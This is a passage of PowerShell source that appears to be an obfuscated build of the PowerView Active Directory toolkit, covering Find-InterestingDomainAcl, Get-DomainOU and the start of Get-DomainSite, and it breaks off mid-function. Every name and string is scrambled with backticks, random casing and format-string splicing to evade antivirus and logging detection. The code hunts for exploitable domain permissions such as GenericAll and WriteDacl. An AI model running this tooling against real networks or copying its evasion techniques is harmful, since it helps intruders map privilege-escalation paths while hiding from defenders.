        if (${PSBoU`N`DPARA`m`EteRs}[("{0}{1}{2}" -f'Crede','ntia','l')]) { ${Ac`l`A`RgUMENts}[("{2}{0}{3}{1}" -f 'den','al','Cre','ti')] = ${crEDE`Nt`IAL} }

        ${Ob`JeCT`sEARcherArgUm`E`NTs} = @{
            ("{0}{1}{2}"-f'P','rop','erties') = ("{2}{3}{1}{5}{0}{4}" -f 'ectclas','ac','sa','m','s','countname,obj')
            'Raw' = ${Tr`Ue}
        }
        if (${pSbo`UnDp`ArAm`EtErS}[("{0}{2}{1}" -f 'Serv','r','e')]) { ${oB`JeCT`sE`ARCHera`RGuments}[("{1}{0}"-f'r','Serve')] = ${s`ErveR} }
        if (${PsboUN`dPA`RAmEtE`RS}[("{3}{0}{2}{1}" -f'earchSc','pe','o','S')]) { ${oBj`EC`TSearche`RA`RgumENTs}[("{2}{1}{0}"-f 'hScope','rc','Sea')] = ${se`ArchsC`ope} }
        if (${psbO`U`NdPARAmE`TerS}[("{1}{2}{0}{3}" -f'lt','Re','su','PageSize')]) { ${o`BJEc`TSEa`RCheraR`gUMeNTS}[("{3}{2}{1}{0}" -f'ize','eS','sultPag','Re')] = ${R`EsULTP`AgE`SI`ze} }
        if (${Psbo`UND`P`AR`AMETeRS}[("{0}{3}{4}{1}{2}" -f 'Serv','mi','t','erTi','meLi')]) { ${oBJecTsEAr`cHE`RARG`U`m`eNTs}[("{0}{2}{3}{1}"-f 'Serv','Limit','erTi','me')] = ${SeR`V`ER`TI`MeLImIt} }
        if (${pSBoUn`dPaRame`T`ers}[("{2}{3}{1}{0}"-f'ne','to','T','ombs')]) { ${o`Bj`ECtseARchErARG`UMe`Nts}[("{1}{0}{2}" -f 'ombsto','T','ne')] = ${To`M`BSTO`Ne} }
        if (${psbOUnd`pAr`AmE`Ters}[("{2}{0}{1}" -f'den','tial','Cre')]) { ${OB`jEC`Ts`EARC`hE`RArGU`ments}[("{1}{0}{2}"-f't','Creden','ial')] = ${C`R`eDe`NTIal} }

        ${AdNam`eaR`gum`E`NtS} = @{}
        if (${PS`Boun`D`pA`RaME`TeRs}[("{2}{1}{0}" -f'r','rve','Se')]) { ${A`dNa`mE`A`RguMenTS}[("{1}{0}"-f 'er','Serv')] = ${S`Erv`eR} }
        if (${P`sboUnDp`Ar`A`m`eTeRS}[("{2}{1}{0}" -f 'al','denti','Cre')]) { ${adNamE`ArguM`E`NTS}[("{0}{1}{2}" -f 'Cre','den','tial')] = ${cR`eDe`NTiaL} }

        
        ${resOlv`edsI`ds} = @{}
    }

    PROCESS {
        if (${PsBO`Un`dp`ARamEte`RS}[("{0}{2}{1}" -f 'D','in','oma')]) {
            ${AclARg`UM`enTS}[("{0}{1}" -f 'Do','main')] = ${D`OMa`iN}
            ${ADnamear`guMEn`Ts}[("{1}{0}"-f'ain','Dom')] = ${do`m`AIn}
        }

        &("{4}{0}{3}{5}{2}{1}"-f 'et-','bjectAcl','inO','Dom','G','a') @ACLArguments | &("{0}{2}{1}" -f 'ForEach-','ject','Ob') {

            if ( (${_}."ActiVEdiReCTO`RY`RIg`h`TS" -match ((("{2}{6}{5}{3}{0}{4}{7}{1}" -f'D','ete','GenericAll{','{0}','e','{0}Create','0}Write','l')) -f  [CHAr]124)) -or ((${_}."aC`TIvEDiR`e`CTOR`y`RIg`hts" -match ("{1}{2}{0}"-f 'ht','Ex','tendedRig')) -and (${_}."ACe`quA`LiFIeR" -match ("{1}{0}" -f'llow','A')))) {
                
                if (${_}."Sec`Ur`ITyiDENtif`iER"."vA`lUe" -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if (${R`E`sOLVe`dSidS}[${_}."s`EcUrIt`y`IDeNT`IfiER"."v`ALUe"]) {
                        ${IDen`T`iTyr`Efe`REN`ce`NAme}, ${IDen`TITyREf`ERenCeD`o`m`AIN}, ${Id`entiT`yr`E`FeRenC`EDN}, ${idENTi`T`YrEf`ER`EN`c`EClasS} = ${r`esoLV`EdsI`DS}[${_}."seC`UR`i`TyideN`TifiEr"."vA`lUE"]

                        ${In`T`Er`eSTInGACl} = &("{1}{0}{2}"-f 'e','New-Obj','ct') ("{0}{1}{2}"-f 'P','SObjec','t')
                        ${Int`eR`E`ST`IngACL} | &("{2}{1}{0}"-f'r','dd-Membe','A') ("{3}{1}{0}{2}"-f 'Prope','ote','rty','N') ("{2}{1}{0}"-f 'DN','ect','Obj') ${_}."o`B`jeCtDn"
                        ${inteR`EstIn`G`ACl} | &("{2}{0}{1}" -f 'dd-','Member','A') ("{2}{0}{1}"-f'ePropert','y','Not') ("{0}{1}{2}" -f'Ac','eQualif','ier') ${_}."A`CEqu`A`lIfIER"
                        ${i`NterESt`iNG`A`CL} | &("{2}{0}{1}"-f'dd','-Member','A') ("{1}{2}{0}" -f'rty','NoteProp','e') ("{3}{4}{2}{1}{5}{0}" -f 's','oryR','irect','A','ctiveD','ight') ${_}."acTiVEDIrE`C`To`R`Y`RIGh`TS"
                        if (${_}."OBj`eCt`ACe`T`ype") {
                            ${inter`EstI`NgacL} | &("{1}{0}{2}" -f'dd-Me','A','mber') ("{1}{2}{0}"-f 'ty','NoteProp','er') ("{0}{1}{2}" -f 'ObjectAc','e','Type') ${_}."O`BJ`EctACETyPE"
                        }
                        else {
                            ${I`N`TErE`StIn`GaCL} | &("{2}{0}{1}" -f'mb','er','Add-Me') ("{3}{2}{0}{1}" -f'Prope','rty','te','No') ("{1}{2}{0}" -f 'ceType','Obj','ectA') ("{0}{1}"-f'N','one')
                        }
                        ${inteRESti`N`gacl} | &("{3}{0}{1}{2}"-f 'dd-','Mem','ber','A') ("{1}{2}{0}" -f'y','NoteProp','ert') ("{1}{2}{0}" -f'Flags','Ac','e') ${_}."ACe`F`lAgS"
                        ${In`TerE`stI`Ngacl} | &("{2}{3}{1}{0}"-f 'er','d-Memb','A','d') ("{1}{2}{3}{0}" -f'erty','Not','eP','rop') ("{0}{1}"-f'Ac','eType') ${_}."A`CET`YPe"
                        ${IN`TeRES`Tin`gACL} | &("{0}{2}{1}" -f'A','mber','dd-Me') ("{3}{2}{1}{0}" -f 'rty','ePrope','ot','N') ("{2}{4}{0}{1}{3}"-f 'c','eFl','Inh','ags','eritan') ${_}."IN`h`eR`ITaNCEflAGs"
                        ${InTE`R`es`TINgAcL} | &("{2}{0}{1}" -f'em','ber','Add-M') ("{1}{2}{3}{0}" -f 'ty','N','otePro','per') ("{4}{0}{3}{1}{2}"-f'ityI','enti','fier','d','Secur') ${_}."Se`c`URit`yideNTiF`IeR"
                        ${InTErES`TIng`A`CL} | &("{2}{3}{1}{0}" -f 'ber','m','Add','-Me') ("{0}{3}{1}{2}"-f'Not','opert','y','ePr') ("{4}{1}{5}{0}{2}{3}" -f 'Referenc','dentit','eNam','e','I','y') ${iDe`Nt`Ity`ReferENcEna`me}
                        ${InT`ER`ESt`ingaCl} | &("{3}{0}{1}{2}" -f'd','-Membe','r','Ad') ("{1}{2}{0}" -f 'operty','N','otePr') ("{5}{2}{1}{0}{3}{4}"-f 'Dom','yReference','t','ai','n','Identi') ${ide`NtitY`ReF`er`e`NCEDom`A`in}
                        ${INtER`e`STI`N`GAcl} | &("{2}{3}{1}{0}" -f'r','Membe','Add','-') ("{1}{2}{0}{3}"-f'pert','NotePr','o','y') ("{0}{1}{3}{2}"-f'I','den','ityReferenceDN','t') ${IDEntIty`Refe`R`EnCeDN}
                        ${In`TeRE`St`iNG`ACL} | &("{2}{0}{1}"-f '-Memb','er','Add') ("{3}{1}{0}{2}"-f'teProp','o','erty','N') ("{0}{3}{1}{4}{2}{5}" -f'Identity','nce','las','Refere','C','s') ${Id`eNti`TYRe`FER`En`cECLA`sS}
                        ${i`Nt`E`Resti`NGAcl}
                    }
                    else {
                        ${I`denT`ItyREf`eRenc`edn} = &("{3}{0}{1}{2}"-f 't-A','DNa','me','Conver') -Identity ${_}."S`eCUriTyi`DENTIfI`eR"."vA`LuE" -OutputType ('DN') @ADNameArguments
                        

                        if (${IdEn`Ti`TYR`efEr`enCeDn}) {
                            ${IdEN`TITYREF`ERENc`ed`Omain} = ${Id`En`TITyrE`Fer`ENCedn}.("{2}{1}{0}" -f'ng','ubStri','S').Invoke(${I`DEntItYREFeR`E`NCEdN}.("{2}{1}{0}"-f 'Of','dex','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            ${OB`JEcT`seA`Rc`HERArg`Ume`Nts}[("{1}{0}" -f'in','Doma')] = ${i`dEnTIT`yRe`F`ERe`NCEd`Omain}
                            ${OB`Je`C`TS`eAr`c`heRar`GuMEnTS}[("{1}{2}{0}"-f'ty','Ide','nti')] = ${IdE`Nti`TYReFer`E`N`cEdN}
                            
                            ${ob`jEct} = &("{4}{1}{2}{3}{0}" -f't','oma','inObj','ec','Get-D') @ObjectSearcherArguments

                            if (${OBJ`ect}) {
                                ${I`dentITyRe`FeR`ENc`EnAmE} = ${oBj`ECt}."Prop`er`T`IEs"."sa`mACCoU`NTNa`Me"[0]
                                if (${o`B`jecT}."p`ROpe`RTIEs"."ObJeCT`cla`Ss" -match ("{0}{1}{2}"-f'compu','t','er')) {
                                    ${i`D`ENt`i`T`YRefEren`CeCLasS} = ("{1}{0}"-f'uter','comp')
                                }
                                elseif (${o`B`jECT}."P`ROpErti`Es"."obJ`eCT`cLASS" -match ("{1}{0}"-f'p','grou')) {
                                    ${i`dentIt`yrEfERENC`eCLA`ss} = ("{0}{1}"-f 'g','roup')
                                }
                                elseif (${o`BJEct}."pR`OPeRTi`es"."o`B`jeC`TclASs" -match ("{0}{1}"-f 'u','ser')) {
                                    ${id`EnTiTYREfeR`e`NCEcL`Ass} = ("{0}{1}" -f 'use','r')
                                }
                                else {
                                    ${IdEn`TiTYrefer`enC`e`c`LaSs} = ${Nu`LL}
                                }

                                
                                ${Re`SolVE`dsI`DS}[${_}."sE`CURI`T`yIDENTif`ier"."va`LuE"] = ${iD`e`NT`It`yrEFer`eNcEN`Ame}, ${iDEN`T`iTYRefERE`NcE`dOMain}, ${IdeNTIt`y`RefER`e`NCedn}, ${IDEN`T`ItYREF`e`Re`N`CeCl`AsS}

                                ${iNTeRE`ST`INg`Acl} = &("{1}{0}{3}{2}"-f'w-O','Ne','t','bjec') ("{1}{0}{2}" -f 'SObj','P','ect')
                                ${InT`EREs`TiNgAcl} | &("{0}{2}{1}"-f'Add-','mber','Me') ("{0}{3}{2}{1}"-f'N','erty','teProp','o') ("{2}{1}{0}" -f 'ctDN','bje','O') ${_}."Obj`ecT`DN"
                                ${i`NtEresT`in`Ga`CL} | &("{0}{1}{2}"-f 'Add-M','emb','er') ("{1}{3}{2}{0}"-f 'ty','N','Proper','ote') ("{2}{1}{0}{3}"-f'l','a','AceQu','ifier') ${_}."aCE`QuA`liFIEr"
                                ${iNT`e`REs`TIn`gaCl} | &("{2}{1}{0}" -f'r','e','Add-Memb') ("{1}{0}{3}{2}" -f'oteProp','N','rty','e') ("{2}{3}{1}{0}{4}{5}"-f 'eD','iv','Ac','t','irec','toryRights') ${_}."Ac`TiVEdIrE`C`T`o`RyRIgHTs"
                                if (${_}."ob`J`EcTAcEt`y`Pe") {
                                    ${I`NterE`S`TIng`ACl} | &("{1}{0}{2}" -f 'mb','Add-Me','er') ("{0}{2}{1}"-f 'Not','roperty','eP') ("{2}{0}{3}{1}" -f'ct','ype','Obje','AceT') ${_}."OBJ`e`CtA`cEt`ypE"
                                }
                                else {
                                    ${INtE`REs`TI`N`GaCL} | &("{1}{0}{2}{3}"-f'Mem','Add-','b','er') ("{1}{0}{3}{2}" -f'tePrope','No','y','rt') ("{2}{1}{0}"-f 'pe','ctAceTy','Obje') ("{0}{1}" -f 'N','one')
                                }
                                ${I`NteREstIn`g`A`Cl} | &("{0}{1}{2}" -f'A','dd-Membe','r') ("{2}{0}{1}" -f'teP','roperty','No') ("{1}{2}{0}"-f'eFlags','A','c') ${_}."ac`EF`laGS"
                                ${I`N`TeRESt`I`NgACl} | &("{2}{1}{3}{0}" -f 'er','em','Add-M','b') ("{1}{2}{0}" -f'perty','NoteP','ro') ("{0}{1}"-f'Ac','eType') ${_}."aCEt`y`pE"
                                ${i`N`T`ErES`Tingacl} | &("{1}{2}{0}" -f'er','A','dd-Memb') ("{2}{3}{1}{0}"-f 'erty','eProp','No','t') ("{3}{2}{0}{1}"-f 't','anceFlags','i','Inher') ${_}."in`hE`RiTANcefL`AGS"
                                ${iNt`erEsTIN`G`A`cL} | &("{2}{1}{0}"-f 'ber','-Mem','Add') ("{3}{2}{0}{1}"-f'ert','y','p','NotePro') ("{1}{2}{3}{0}{4}" -f'enti','Securi','tyI','d','fier') ${_}."Se`CuRiTYiDE`NTI`FIer"
                                ${INteRE`sTiNg`A`cl} | &("{0}{2}{1}"-f'A','Member','dd-') ("{0}{2}{1}" -f 'Note','rty','Prope') ("{2}{3}{1}{0}{4}"-f 'Nam','ence','IdentityRef','er','e') ${IDE`NT`I`TYRe`F`EREnC`Ename}
                                ${i`NTe`RE`STinGaCl} | &("{0}{3}{1}{2}" -f 'A','d','-Member','d') ("{2}{0}{1}" -f 'o','perty','NotePr') ("{4}{5}{0}{3}{1}{6}{2}"-f'ntityRefe','en','ain','r','I','de','ceDom') ${idEnTitYre`Fe`Rence`domA`IN}
                                ${INtE`Res`TinGACL} | &("{1}{0}{2}" -f 'e','Add-M','mber') ("{0}{1}{2}{3}"-f'N','oteP','ropert','y') ("{3}{2}{0}{1}" -f'rence','DN','tityRefe','Iden') ${i`den`TItYREf`erEnce`dn}
                                ${INt`ER`e`STiNGaCl} | &("{1}{0}{2}" -f'Memb','Add-','er') ("{0}{2}{1}{3}"-f'Not','ert','eProp','y') ("{0}{6}{1}{2}{5}{3}{4}"-f'Identity','e','fer','eCl','ass','enc','R') ${iDe`NTITY`RE`FERENCeCLA`ss}
                                ${INt`eRE`STING`Acl}
                            }
                        }
                        else {
                            &("{1}{0}{2}{3}" -f 'rite-','W','War','ning') "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}


function GET`-`DOma`iNou {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{4}{2}" -f'PS','ro','ss','ShouldP','ce'}, '')]
    [OutputType({"{1}{3}{2}{0}"-f 'U','Powe','ew.O','rVi'})]
    [CmdletBinding()]
    Param (
        [Parameter(posITioN = 0, ValuEfROmPIpeLIne = ${Tr`UE}, ValUeFrOMpiPeLiNEByPrOpertYNAme = ${tR`UE})]
        [Alias({"{0}{1}"-f 'Na','me'})]
        [String[]]
        ${IDEN`TI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}"-f 'ID','GU'})]
        ${gPL`INK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`Om`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'F','il','ter'})]
        [String]
        ${L`daP`FiL`TEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${proPe`Rt`Ies},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'A','D','SPath'})]
        [String]
        ${seA`R`c`hBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}{4}"-f 'i','Doma','nCo','n','troller'})]
        [String]
        ${S`ERVEr},

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{0}{1}" -f 'OneLe','vel'}, {"{1}{0}"-f'ee','Subtr'})]
        [String]
        ${SEAR`cH`scopE} = ("{1}{0}"-f'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`SuLtP`AGES`iZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRV`er`Tim`e`LiMIt},

        [ValidateSet({"{1}{0}"-f'acl','D'}, {"{0}{1}"-f 'Grou','p'}, {"{0}{1}" -f 'No','ne'}, {"{0}{1}"-f 'Ow','ner'}, {"{0}{1}"-f'Sa','cl'})]
        [String]
        ${SEcUr`i`TyMAs`kS},

        [Switch]
        ${T`oMbsTo`NE},

        [Alias({"{1}{0}{2}{3}" -f 'tur','Re','n','One'})]
        [Switch]
        ${fIn`dOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REde`NTIAl} =  ( iTEM  ("vARi"+"aBle:"+"2"+"1gV7E")).VALUE::"e`MPTy",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${Sea`R`CHER`Ar`GUme`NTs} = @{}
        if (${pSBo`Un`dpA`R`AMetErS}[("{0}{1}" -f'Do','main')]) { ${SeA`RCh`e`RaR`GU`MeNts}[("{0}{1}"-f 'D','omain')] = ${do`Ma`in} }
        if (${PSBoun`dparAM`eT`Ers}[("{0}{1}{2}"-f 'Pro','p','erties')]) { ${sE`A`RCHeRarGU`MEN`Ts}[("{2}{0}{1}" -f 'per','ties','Pro')] = ${PRopE`Rt`I`Es} }
        if (${p`SBoUn`dp`A`Ra`meTeRS}[("{1}{0}{3}{2}"-f'r','Sea','e','chBas')]) { ${SeA`RCherAR`gU`m`enTS}[("{0}{2}{3}{1}"-f 'Sea','ase','rch','B')] = ${Sea`Rc`hBase} }
        if (${psBO`UNdp`ArAMet`e`RS}[("{1}{0}" -f 'erver','S')]) { ${S`E`ARCHe`Rarg`UmeNtS}[("{1}{0}"-f 'erver','S')] = ${sE`RV`ER} }
        if (${ps`B`oUNd`PaRA`Me`TErS}[("{2}{3}{0}{1}"-f'chScop','e','Se','ar')]) { ${se`ARCH`eR`ArguMENtS}[("{0}{1}{2}" -f 'Searc','h','Scope')] = ${SeaRCh`sC`Ope} }
        if (${PS`BOUndPaRa`MeTE`RS}[("{3}{0}{1}{2}"-f 'esu','ltPageS','ize','R')]) { ${Sear`cHEr`ArGu`M`enTS}[("{3}{2}{1}{0}"-f'e','iz','esultPageS','R')] = ${reSu`lTPAGEs`I`zE} }
        if (${PSB`OU`N`DPArameTe`RS}[("{1}{2}{0}" -f 'TimeLimit','Ser','ver')]) { ${S`ea`RchERaRgum`eNtS}[("{0}{3}{1}{2}" -f'Serv','eLim','it','erTim')] = ${S`Er`VErTI`meLIm`It} }
        if (${PS`BO`UN`DpaRameT`erS}[("{1}{2}{4}{3}{0}" -f'sks','Se','cu','a','rityM')]) { ${Se`A`RcHeraRgU`MENTs}[("{1}{0}{3}{2}"-f 'M','Security','ks','as')] = ${sEcu`Ri`TY`MAsKS} }
        if (${pS`BO`UNdPAR`Am`e`TErs}[("{2}{1}{0}" -f 'tone','s','Tomb')]) { ${SeA`RchERarg`Umen`Ts}[("{2}{1}{0}" -f'e','n','Tombsto')] = ${TO`MbS`TOne} }
        if (${P`sBO`UnD`P`ArAmEtErS}[("{1}{0}{2}{3}" -f 'ed','Cr','en','tial')]) { ${sEA`RCHE`RArgu`menTs}[("{1}{0}{2}"-f'dentia','Cre','l')] = ${c`REden`TIaL} }
        ${Ous`eaRcH`er} = &("{1}{3}{0}{2}{4}" -f 'mainSear','G','che','et-Do','r') @SearcherArguments
    }

    PROCESS {
        if (${ouseA`RcH`Er}) {
            ${iD`e`NtiT`yfI`ltER} = ''
            ${F`I`lTer} = ''
            ${i`DEN`TItY} | &("{0}{2}{3}{1}"-f'Where-Obj','t','e','c') {${_}} | &("{3}{1}{2}{0}"-f'ct','o','rEach-Obje','F') {
                ${I`d`ENTity`InstaNce} = ${_}.("{0}{1}" -f 'R','eplace').Invoke('(', '\28').("{0}{1}" -f 'R','eplace').Invoke(')', '\29')
                if (${id`ENTItY`iN`st`Ance} -match ("{0}{2}{1}"-f '^O','*','U=.')) {
                    ${iDENtI`TYFil`T`er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${p`S`B`oundPArAMe`TeRS}[("{1}{0}"-f 'in','Doma')]) -and (-not ${P`sBo`UnD`pAraMet`e`RS}[("{2}{0}{1}" -f 'archBa','se','Se')])) {
                        
                        
                        ${iD`eN`TITYD`OMAIn} = ${i`d`eNTit`yInStANce}.("{2}{1}{0}" -f'ing','bStr','Su').Invoke(${iDE`NTitY`Ins`TAN`Ce}.("{0}{1}"-f'I','ndexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{4}{1}{3}{0}" -f'ose','-Ve','Wr','rb','ite') ('[Ge'+'t-Doma'+'inOU] '+'Ex'+'tracted'+' '+'d'+'o'+'main '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${seAR`CHE`RAr`Gumen`Ts}[("{0}{2}{1}" -f 'Do','in','ma')] = ${ID`En`Ti`TydoMA`In}
                        ${OU`S`earCHer} = &("{3}{0}{4}{2}{1}"-f'inS','r','he','Get-Doma','earc') @SearcherArguments
                        if (-not ${oUs`EARc`her}) {
                            &("{0}{1}{3}{2}" -f 'Write','-War','ing','n') ('[Get'+'-Do'+'m'+'ainOU]'+' '+'U'+'na'+'ble '+'to'+' '+'r'+'etri'+'eve'+' '+'d'+'omain '+'search'+'e'+'r '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${G`U`idb`YTESTrIng} = (-Join (([Guid]${Id`E`NTIty`Insta`N`cE}).("{1}{2}{0}{3}" -f'ra','ToByte','Ar','y').Invoke() | &("{1}{0}{3}{4}{2}"-f '-Ob','ForEach','t','je','c') {${_}.("{2}{1}{0}"-f'ing','oStr','T').Invoke('X').("{0}{2}{1}"-f'Pad','eft','L').Invoke(2,'0')})) -Replace (("{1}{0}" -f'.)','(.')),'\$1'
                        ${IdENTItYF`I`Lt`eR} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${I`dEnTI`TYfILT`ER} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${Id`E`NTi`TYfi`lTer} -and (${idENt`I`TY`Fi`LTER}.("{0}{1}" -f'Tr','im').Invoke() -ne '') ) {
                ${fil`T`eR} += "(|$IdentityFilter)"
            }

            if (${PSBoUNdp`A`R`AMeTE`Rs}[("{2}{0}{1}"-f'n','k','GPLi')]) {
                &("{2}{3}{1}{0}"-f'-Verbose','e','Wri','t') ('[Ge'+'t-D'+'om'+'ainOU]'+' '+'S'+'earchin'+'g '+'fo'+'r '+'OUs'+' '+'wit'+'h '+"$GPLink "+'set'+' '+'i'+'n '+'t'+'he '+'gpL'+'in'+'k '+'propert'+'y')
                ${fIl`T`ER} += "(gplink=*$GPLink*)"
            }

            if (${pSBO`U`Nd`para`m`ETErs}[("{3}{1}{0}{2}"-f'il','DAPF','ter','L')]) {
                &("{2}{1}{3}{0}" -f'rbose','te','Wri','-Ve') ('[Get'+'-Do'+'mainOU'+'] '+'Usin'+'g '+'add'+'i'+'tional '+'LD'+'AP '+'fi'+'lt'+'er: '+"$LDAPFilter")
                ${Fil`T`Er} += "$LDAPFilter"
            }

            ${oUse`ARC`h`er}."FiL`TEr" = "(&(objectCategory=organizationalUnit)$Filter)"
            &("{1}{0}{4}{3}{2}"-f 'i','Wr','bose','-Ver','te') "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if (${PSb`o`U`NDpARameTers}[("{0}{2}{1}"-f'F','ndOne','i')]) { ${R`eS`UlTS} = ${O`Us`ear`chER}.("{0}{1}"-f'FindO','ne').Invoke() }
            else { ${r`ES`UltS} = ${OU`seAr`CHer}.("{2}{1}{0}" -f 'll','ndA','Fi').Invoke() }
            ${R`esuLtS} | &("{1}{2}{0}" -f'ject','Wher','e-Ob') {${_}} | &("{3}{2}{1}{0}{4}" -f 'h-Obje','rEac','o','F','ct') {
                if (${psboUnd`pARAME`T`ErS}['Raw']) {
                    
                    ${o`U} = ${_}
                }
                else {
                    ${O`U} = &("{3}{1}{0}{2}{4}" -f 'rt-L','e','DAPProper','Conv','ty') -Properties ${_}."PROpE`RtI`ES"
                }
                ${o`U}."PsoBJe`ct"."TYp`EN`AmEs".("{1}{0}" -f 'rt','Inse').Invoke(0, ("{3}{0}{2}{1}"-f'werView','OU','.','Po'))
                ${o`U}
            }
            if (${RES`UL`TS}) {
                try { ${reS`U`lTS}.("{2}{1}{0}" -f 'se','spo','di').Invoke() }
                catch {
                    &("{1}{2}{0}"-f 'ose','Write-','Verb') ('[G'+'et'+'-'+'Do'+'mainOU] '+'Err'+'or'+' '+'d'+'isp'+'osing'+' '+'of'+' '+'t'+'he '+'Re'+'su'+'lts '+'objec'+'t:'+' '+"$_")
                }
            }
            ${ousE`AR`CH`ER}.("{2}{0}{1}"-f 'ispo','se','d').Invoke()
        }
    }
}


function gE`T-DomA`iNSi`TE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}"-f'ho','S','uldProcess','PS'}, '')]
    [OutputType({"{2}{0}{4}{1}{3}" -f 'erVi','w.Sit','Pow','e','e'})]
    [CmdletBinding()]
    Param (
        [Parameter(poSITION = 0, VALUEfrOmpIPeLINE = ${tr`UE}, VALueFrOMPIpELiNeBYprOPERtyName = ${tR`UE})]
        [Alias({"{1}{0}" -f'e','Nam'})]
        [String[]]
        ${iD`EnT`ITY},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}"-f'UID','G'})]
        ${g`plI`Nk},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`om`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ter','Fil'})]
        [String]
        ${lDaP`FiL`TER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`oPeRT`iES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'h','ADS','Pat'})]
        [String]
        ${sea`Rc`HBa`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{0}{1}" -f 'nControll','er','D','omai'})]
        [String]
        ${s`Er`VeR},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{1}{2}{0}" -f'evel','One','L'}, {"{2}{1}{0}"-f'ee','ubtr','S'})]
        [String]
        ${sea`RC`HS`coPE} = ("{1}{0}"-f 'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${res`U`L`TpAgEsIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`E`RVert`imEL`ImIT},

        [ValidateSet({"{1}{0}" -f 'l','Dac'}, {"{0}{1}" -f'G','roup'}, {"{0}{1}" -f 'Non','e'}, {"{1}{0}"-f'r','Owne'}, {"{0}{1}"-f 'Sa','cl'})]
        [String]
        ${SEc`URItY`M`AsKs},

        [Switch]
        ${tomB`sTO`Ne},

        [Alias({"{1}{0}" -f'turnOne','Re'})]
        [Switch]
        ${f`iNDone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eDe`NtiAl} =  $21gV7E::"Emp`TY",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${SEAR`CHErA`RG`UMEN`TS} = @{
            ("{3}{0}{1}{2}"-f 'chBase','P','refix','Sear') = ("{0}{6}{1}{3}{2}{5}{4}" -f 'CN=','tes,C','ti','N=Configura','n','o','Si')
        }
        if (${psBou`NdpArAMeT`e`RS}[("{1}{0}"-f'main','Do')]) { ${sE`Arch`ERar`g`UM`entS}[("{1}{0}" -f'in','Doma')] = ${dO`ma`iN} }
        if (${PSBOundpARA`m`ET`ers}[("{0}{2}{1}" -f'P','perties','ro')]) { ${seaR`cHe`RArg`U`mENtS}[("{2}{1}{0}"-f's','opertie','Pr')] = ${pROpe`R`T`IeS} }
        if (${Psb`oun`dPaRA`mET`ERs}[("{1}{0}{2}{3}" -f'ear','S','c','hBase')]) { ${SeaR`C`He`RA`RgUM`Ents}[("{2}{0}{1}" -f'a','se','SearchB')] = ${S`eaRC`hbAsE} }
        if (${pS`Boundpa`R`A`metErs}[("{0}{1}" -f 'Ser','ver')]) { ${seArcHE`R`AR`G`Um`EnTs}[("{2}{0}{1}"-f'rve','r','Se')] = ${sE`RVEr} }
        if (${PSbOUn`D`Par`AM`eT`ErS}[("{0}{3}{1}{2}"-f'S','chScop','e','ear')]) { ${s`EARcheRARgu`m`ENts}[("{0}{1}{3}{2}" -f 'S','e','pe','archSco')] = ${SEa`RChS`CO`Pe} }
        if (${psb`o`UNdpARam`eters}[("{1}{3}{2}{0}" -f'tPageSize','R','sul','e')]) { ${Se`Ar`C`HerArGUmentS}[("{1}{0}{2}" -f 'ultPageS','Res','ize')] = ${R`E`SultpAgeSI`ZE} }
        if (${PSBoUnDPA`Ra`Me`T`ErS}[("{3}{1}{4}{2}{0}"-f'imit','v','L','Ser','erTime')]) { ${s`eaRCHER`Argu`M`enTs}[("{4}{0}{1}{2}{3}"-f'ver','Ti','meLim','it','Ser')] = ${SerVEr`T`ImeLI`M`it} }
        if (${P`s`BO`Undpa`RAMe`TeRs}[("{3}{1}{2}{0}" -f'sks','c','urityMa','Se')]) { ${sEARc`H`ERAr`g`U`MentS}[("{2}{3}{1}{0}"-f 'sks','Ma','Secu','rity')] = ${S`ecu`RiTym`AskS} }
        if (${pS`B`Oun`dpaRamE`TerS}[("{0}{2}{1}"-f 'T','ne','ombsto')]) { ${sEA`RCh`ErA`Rg`UmenTS}[("{2}{1}{0}"-f 'ne','sto','Tomb')] = ${toMb`sT`onE} }
        if (${P`SbO`UNdPA`RAMet`eRs}[("{2}{0}{3}{1}" -f'redent','al','C','i')]) { ${sE`ArcHerAr`Gu`M`ENTS}[("{0}{2}{1}" -f'Cre','ential','d')] = ${c`ReD`En`TIaL} }
        ${s`i`T`EsEArCHEr} = &("{4}{2}{5}{0}{3}{1}" -f'Sea','her','omai','rc','Get-D','n') @SearcherArguments
    }

    PROCESS {
        if (${sItes`ear`cHEr}) {
            ${idenTit`y`F`ilter} = ''
            ${F`i`ltEr} = ''
